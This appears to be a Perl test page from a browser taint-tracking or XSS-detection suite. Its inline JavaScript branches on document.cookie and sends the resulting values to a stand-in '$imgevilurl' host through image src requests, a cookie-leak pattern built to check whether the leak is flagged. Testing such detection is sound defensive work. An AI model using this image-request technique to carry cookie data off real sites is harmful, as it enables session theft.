#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_GETARG";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 
		function testf(a) {
				notevil = a;
		}
		testf(1);
		
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 
		function testf2(a2) {
			if ($evil) {
				notevil2 = a2;
			}
		}
		testf2(2);
	
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage 	
		function testf3(a3) {
			notevil3 = a3;
		}
		testf3(evil);
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
